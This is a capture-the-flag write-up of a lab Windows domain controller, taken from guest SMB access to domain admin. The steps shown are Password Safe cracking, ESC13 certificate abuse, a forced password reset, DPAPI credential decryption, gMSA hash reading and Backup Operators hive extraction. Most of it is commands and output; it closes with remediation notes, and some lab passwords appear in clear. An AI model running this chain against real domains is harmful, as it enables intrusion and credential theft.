# HackSmarter: Kitsune — From Guest SMB to Domain Admin via ESC13

**Difficulty:** Easy
**OS:** Windows Server 2025 (Domain Controller)
**Key Vulnerabilities:** Guest SMB access, weak Password Safe master password, ESC13 (AD CS), DPAPI credential theft, gMSA password read, `Backup Operators` privilege abuse.

<img width="1600" height="912" alt="a0ef2bab-2139-472f-a801-9e8a1271bcc4" src="https://github.com/user-attachments/assets/795d660c-9946-4cd9-8d30-b3c7b12461bd" />

---

## Executive Summary

Kitsune is an Active Directory lab that chains several realistic weaknesses into full domain compromise: unauthenticated SMB guest access exposes a Password Safe database, a weak master password yields initial credentials, an AD CS misconfiguration (`ESC13`) lets a low-privileged user inherit `HelpDesk` rights, DPAPI-protected credentials and a `ReadGMSAPassword` delegation expose a gMSA, and membership in `Backup Operators` allows offline hive extraction to recover the local Administrator hash. Notably, DCSync is blocked — the `Backup Operators` path is the fallback.

---

## 1. Enumeration

A full TCP scan against `10.0.20.28` shows the standard DC footprint:

- DNS (53), Kerberos (88/464), LDAP (389/636), SMB (139/445), WinRM (5985), RDP (3389)
- An Enterprise CA named `kitsune-DC01-CA` is present → AD CS is in use
- SMB signing is **required**

We add the DC to `/etc/hosts` for clean Kerberos/LDAP:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune]─[10.200.110.236]
└──╼ $ sudo nxc smb 10.0.20.28 -u guest -p '' --generate-hosts-file /etc/hosts
[sudo] password for donmed: 
SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.20.28      445    DC01             [+] kitsune.local\guest: 

```

With no credentials, we test guest SMB and find that guest auth succeeds with a readable share named `Files`:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune]─[10.200.110.236]
└──╼ $ nxc smb 10.0.20.28 -u guest -p '' --shares
SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.20.28      445    DC01             [+] kitsune.local\guest: 
SMB         10.0.20.28      445    DC01             [*] Enumerated shares
SMB         10.0.20.28      445    DC01             Share           Permissions     Remark
SMB         10.0.20.28      445    DC01             -----           -----------     ------
SMB         10.0.20.28      445    DC01             ADMIN$                          Remote Admin
SMB         10.0.20.28      445    DC01             C$                              Default share
SMB         10.0.20.28      445    DC01             Files           READ            Global file share
SMB         10.0.20.28      445    DC01             IPC$            READ            Remote IPC
SMB         10.0.20.28      445    DC01             NETLOGON                        Logon server share 
SMB         10.0.20.28      445    DC01             SYSVOL                          Logon server share 
```

---

## 2. Initial Foothold — Cracking the Password Safe

Enumerating the `Files` share with `smbclient.py`, we pull a Password Safe database:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune]─[10.200.110.236]
└──╼ $ impacket-smbclient 'kitsune.local/guest:@DC01.kitsune.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
Files
IPC$
NETLOGON
SYSVOL
# use Files
# ls
drw-rw-rw-          0  Fri Oct 23 23:07:25 2026 .
drw-rw-rw-          0  Fri Oct 23 22:32:29 2026 ..
-rw-rw-rw-       3190  Tue Oct 13 04:08:21 2026 10-11-Calendar_October.pdf
-rw-rw-rw-       4076  Tue Oct 13 04:10:23 2026 10-11-Financial_Report.pdf
-rw-rw-rw-       3854  Tue Oct 13 04:10:27 2026 10-11-Timesheet.pdf

```

The file `logins.psafe3` is a Password Safe V3 database protected by a master passphrase. We extract a crackable hash and run John:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune]─[10.200.110.236]
└──╼ $ hashcat shares/logins.psafe3 /usr/share/wordlists/rockyou.txt -m 5200
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 PRO 5650U with Radeon Graphics, 6347/12758 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

shares/logins.psafe3:'REDACTED'                          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: shares/logins.psafe3
Time.Started.....: Sat Oct 24 11:31:54 2026 (4 secs)
Time.Estimated...: Sat Oct 24 11:31:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      417 H/s (11.38ms) @ Accel:128 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1536/14344385 (0.01%)
Rejected.........: 0/1536 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:327680-327681
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> mexico1
Hardware.Mon.#1..: Temp: 57c Util: 95%

Started: Sat Oct 24 11:31:53 2026
Stopped: Sat Oct 24 11:31:59 2026
```
with the tool psafe3dump we could extrcat the creds of **`ranch`**

```┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ psafe3dump ../../shares/logins.psafe3 hellokitty
Warning: using insecure memory!
type=00  len=  2  785
type=01  len= 16  e6964a8b-6c5c-4776-9a50-ae428b728a38
type=02  len=  0  
type=04  len=  4  2026-10-12T21:49:34Z
type=13  len=  4  
type=07  len=  4  root
type=08  len=  4  kali
type=06  len= 12  pwsafe v1.26

type=01  len= 16  7237c7ab-daa2-4a56-8b6d-133784d93cb3
type=03  len= 15  SQL Credentials
type=04  len=  4  root
type=06  len= 12  'REDACTED'
type=07  len=  4  2026-10-12T21:45:05Z

type=01  len= 16  b80b39d4-5623-4208-b7c0-2608912b0c69
type=03  len=  9  Duo Login
type=04  len=  5  admin
type=06  len= 12  'REDACTED'
type=14  len= 19  admin@kitsune.local
type=07  len=  4  2026-10-12T21:45:24Z

type=01  len= 16  c7ecf27b-cba3-4dcf-ad30-b262e4e269a9
type=03  len= 19  Network Credentials
type=04  len=  5  ranch
type=06  len= 10  'REDACTED'
type=14  len= 19  ranch@kitsune.local
type=07  len=  4  2026-10-12T21:44:48Z


```

The master password cracks quickly. Opening the database gives us several credentials. One of them — **`ranch`** — authenticates to SMB and has write access to the share:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ nxc smb DC01.kitsune.local -u ranch -p 'REDACTED' --shares
SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.20.28      445    DC01             [+] kitsune.local\ranch:R@nch2026! 
SMB         10.0.20.28      445    DC01             [*] Enumerated shares
SMB         10.0.20.28      445    DC01             Share           Permissions     Remark
SMB         10.0.20.28      445    DC01             -----           -----------     ------
SMB         10.0.20.28      445    DC01             ADMIN$                          Remote Admin
SMB         10.0.20.28      445    DC01             C$                              Default share
SMB         10.0.20.28      445    DC01             Files           READ,WRITE      Global file share
SMB         10.0.20.28      445    DC01             IPC$            READ            Remote IPC
SMB         10.0.20.28      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.20.28      445    DC01             SYSVOL          READ            Logon server share 

```

---

## 3. AD Enumeration and ESC13 Discovery

Running BloodHound from `ranch` shows no immediate path to privilege escalation, but it is a member of *Certificate Service DCOM Access*, which points toward AD CS. We run Certipy in vulnerable mode:

<img width="1177" height="717" alt="image" src="https://github.com/user-attachments/assets/26297ec5-3913-433b-9e17-cbd67ad75f54" />

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ certipy-ad find -u 'ranch@kitsune.local' -p 'REDACTED'  -dc-ip 10.0.20.28 -target DC01.kitsune.local -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'kitsune-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'kitsune-DC01-CA'
[*] Checking web enrollment for CA 'kitsune-DC01-CA' @ 'DC01.kitsune.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20261024114322_Certipy.txt'
[*] Wrote text output to '20261024114322_Certipy.txt'
[*] Saving JSON output to '20261024114322_Certipy.json'
[*] Wrote JSON output to '20261024114322_Certipy.json'
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ cat 20261024114322_Certipy.json | jq . | grep ESC13
        "ESC13": "Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'."
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ 

```

The result flags the **`Kitsune-User`** template as vulnerable to **ESC13**.

### What is ESC13?

ESC13 abuses the *Issuance Policy → Group Link* feature introduced in Windows Server 2016. When a template carries an Issuance Policy OID that is linked to an AD group, the CA embeds that group's SID into the issued certificate. During PKINIT, the KDC reads the SID and injects it into the user's PAC — **without the user ever being a member of the group**.

In this lab, `Kitsune-User` is linked to **`HelpDesk`**, and BloodHound shows `HelpDesk` has `GenericAll` over the user **`schlop`**.

---

## 4. Exploiting ESC13 to Compromise `schlop`

We request a certificate from `Kitsune-User`. The first attempt fails: the template enforces a **4096-bit minimum RSA key**, while Certipy defaults to 2048. Re-request with the correct size:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ certipy-ad req -u 'ranch@kitsune.local' -p 'REDACTED'  -dc-ip  10.0.20.28  -target DC01.kitsune.local  -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 38
[*] Successfully requested certificate
[*] Got certificate with UPN 'ranch@kitsune.local'
[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Saving certificate and private key to 'ranch.pfx'
[*] Wrote certificate and private key to 'ranch.pfx'

```

The output is `ranch.pfx`. Authenticating with it yields a TGT whose PAC carries the `HelpDesk` SID:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ certipy-ad auth -pfx ranch.pfx -dc-ip 10.0.20.28
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ranch@kitsune.local'
[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
[*] Using principal: 'ranch@kitsune.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ranch.ccache'
[*] Wrote credential cache to 'ranch.ccache'
[*] Trying to retrieve NT hash for 'ranch'
[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:'REDACTED'

┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ export KRB5CCNAME=ranch.ccache

```

Using `bloodyAD` in Kerberos mode, we confirm we can write to `schlop`, then reset their password:

<img width="1042" height="413" alt="image" src="https://github.com/user-attachments/assets/9274c894-bf63-47b8-aeeb-643e925febf8" />


```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ bloodyAD -d kitsune.local -u ranch --host DC01.kitsune.local -k set password 'schlop' 'Password123@'
[+] Password changed successfully!
```

WinRM as `schlop` gives us the user flag because he is a member of `REMOTE MANAGEMENT USERS` group:

<img width="747" height="353" alt="image" src="https://github.com/user-attachments/assets/a68cfffa-b631-422c-a88d-3641129950c8" />


```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ evil-winrm -i DC01.kitsune.local -u schlop -p 'Password123@'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\schlop\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\schlop\Desktop> ls


    Directory: C:\Users\schlop\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:33 AM            344 user.txt


*Evil-WinRM* PS C:\Users\schlop\Desktop> cat user.txt
  ,-.       _,---._ __  / \
 /  )    .-'       `./ /   \
(  (   ,'            `/    /|
 \  `-"             \'\   / |
  `.              ,  \ \ /  |
   /`.          ,'-`----Y   |
  (            ;        |   '
  |  ,-.    ,-'         |  /
  |  | (   |       yay! | /
  )  |  \  `.___________|/
  `--'   `--'

HSM{'REDACTED'}

```

> **Note:** the `HelpDesk` SID exists only inside the PAC of a Kerberos ticket. NTLM (`-H`, `--use-kcache` with SAMR resets, etc.) will be rejected — `certipy auth` + `-k` is mandatory here.

---

## 5. DPAPI Credential Theft — Pivot to `pebble`

Inside `C:\Users\schlop\Documents\` sits `networkAuth.cred` — a **PowerShell `PSCredential`** serialized with `Export-Clixml`. Its `<SS N="Password">` field is a DPAPI blob.

```

*Evil-WinRM* PS C:\Users\schlop\Documents> ls


    Directory: C:\Users\schlop\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   2:37 AM           1770 networkAuth.cred


```

Because we're running as `schlop` — the same user who protected the blob — DPAPI's `CryptUnprotectData` can decrypt it without any master key gymnastics:

```
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred = Import-Clixml "C:\Users\schlop\Documents\networkAuth.cred"
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
 
'REDACTED'

```

The plaintext belongs to **`pebble`**. We verify it:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ nxc smb DC01.kitsune.local -u pebble -p 'PebbleIs47!' --shares
SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.20.28      445    DC01             [+] kitsune.local\pebble:PebbleIs47! 
SMB         10.0.20.28      445    DC01             [*] Enumerated shares
SMB         10.0.20.28      445    DC01             Share           Permissions     Remark
SMB         10.0.20.28      445    DC01             -----           -----------     ------
SMB         10.0.20.28      445    DC01             ADMIN$                          Remote Admin
SMB         10.0.20.28      445    DC01             C$                              Default share
SMB         10.0.20.28      445    DC01             Files           READ,WRITE      Global file share
SMB         10.0.20.28      445    DC01             IPC$            READ            Remote IPC
SMB         10.0.20.28      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.20.28      445    DC01             SYSVOL          READ            Logon server share```


> **Dead end to note:** using `SharpDPAPI credentials /target:networkAuth.cred` fails with a buffer error because `.cred` here is a serialized `PSCredential` XML, not a native Credential Manager file. Using `Import-Clixml` in the same user context is the correct path.

---

## 6. Reading the gMSA Password

BloodHound shows `pebble` is in the **`IT`** group, which holds `ReadGMSAPassword` over `SVC_GMSA$`. NetExec's LDAP module extracts the gMSA's NTLM hash directly:
<img width="804" height="448" alt="image" src="https://github.com/user-attachments/assets/70e972ab-b127-44a9-af28-043d92c2ebcb" />


```
nxc ldap DC01.kitsune.local -u pebble -p 'REDACTED' --gmsa
```

We confirm the hash works:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
└──╼ $ nxc ldap DC01.kitsune.local -u pebble -p 'REDACTED' --gmsa
LDAP        10.0.20.28      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
LDAP        10.0.20.28      389    DC01             [+] kitsune.local\pebble:'REDACTED' 
LDAP        10.0.20.28      389    DC01             [*] Getting GMSA Passwords
LDAP        10.0.20.28      389    DC01             Account: svc_gmsa$            NTLM: 'REDACTED'     PrincipalsAllowedToReadPassword: IT
```

---

## 7. Domain Compromise via `Backup Operators`

`SVC_GMSA$` is a member of **`Backup Operators`**. This grants `SeBackupPrivilege` on the DC, which is enough to back up registry hives and files, but **not** the replication rights needed for DCSync:

<img width="841" height="439" alt="image" src="https://github.com/user-attachments/assets/b1348597-8a47-46ab-b7a8-00f3a0a4de5e" />

The clean path is the NetExec `backup_operator` module, which drives the backup via SMB and parses the hives locally:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ nxc smb DC01.kitsune.local -u 'svc_gmsa$' -H 'REDACTED' -M backup_operator
SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.20.28      445    DC01             [+] kitsune.local\svc_gmsa$:'REDACTED' 
```

The module returns the **local Administrator NTLM hash**. WinRM as Administrator gives the root flag:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
└──╼ $ evil-winrm -i DC01.kitsune.local -u administrator -H 'REDACTED'1
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
......................................................................
......................................................................
......................................................................
................................-%@@%-................................
.............................:%@@@@@@@@%:.............................
............................*@@@@@@@@@@@@#............................
...........................%@@@@@@@@@@@@@@@...........................
..........................@@@@@@@@@@@@@@@@@@:.........................
.........................@@@@@%#=-::-=#%@@@@@:........................
........................#@%+-=++=:..:=+++-=%@#........................
.......................=@%@@@-..:*@@#:..-@@@@@+.......................
.......................#@@@@##:::%--%:::##@@@@#.......................
.......................-@@@@+.:::....:::.+@@@@-.......................
........................:@@@@-..........-@@@@:........................
.......................-##*@@@#........#@@@*##=.......................
....................-@@@@@@%%@@@%+::+%@@@%%@@@@@@-....................
...................%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%...................
..................%@@@=------------------------=@@@%..................
.................*@@@#..........................%@@@+.................
.................@@@@@..........................@@@@@.................
................+@@@@@:..........*@@#..........:@@@@@+................
................#@@@@@=..........:@@-..........=@@@@@#................
................*@@@@@*........ranch...........*@@@@@*................
......................%.......obtained.........@......................
......................=@@@@@@@@@@@@@@@@@@@@@@@@=......................
......................................................................

HSM{'REDACTED'}

```

---

## Attack Chain Summary

| Step | Action | Tool |
|:-----|:-------|:-----|
| 1 | Guest SMB → `Files` share | `nxc smb`, `smbclient.py` |
| 2 | Crack Password Safe → `ranch` creds | `pwsafe2john`, `john` |
| 3 | Enumerate AD CS → ESC13 on `Kitsune-User` | `certipy find` |
| 4 | ESC13 → `HelpDesk` PAC → reset `schlop` | `certipy req`, `certipy auth`, `bloodyAD` |
| 5 | WinRM `schlop` → user flag; DPAPI → `pebble` password | `evil-winrm`, `Import-Clixml` |
| 6 | `pebble` → `ReadGMSAPassword` → `SVC_GMSA$` hash | `nxc ldap --gmsa` |
| 7 | `SVC_GMSA$` → `Backup Operators` → local Admin hash | `nxc smb -M backup_operator` |

---

## Remediation Notes

- **Guest SMB access** — disable the guest account and enforce `RestrictNullSessAccess = 1`. SMB signing alone is not enough to stop unauthenticated file access.
- **Password Safe hygiene** — a weak master password turns a "safe" into a credential disclosure. Enforce a strong master passphrase and rotate any credentials stored within once compromise is suspected.
- **ESC13** — audit every template with an Issuance Policy. If a policy is linked to a group, ensure the template's Enroll permission is scoped to the exact users who should receive that group's rights, not to `Domain Users`.
- **DPAPI** — treat any `*.cred`/`Export-Clixml` file in a user profile as an in-scope secret. `Import-Clixml` decryption requires only the owning user's context, so folder ACLs must be tight.
- **gMSA delegation** — `ReadGMSAPassword` is very powerful; restrict it to the service owner rather than broad groups like `IT`.
- **`Backup Operators`** — membership effectively grants SYSTEM-equivalent file access on domain controllers. Treat it as a Tier-0 group, and audit hive access (`reg save`, `diskshadow`, `wbadmin`) via EDR.

---

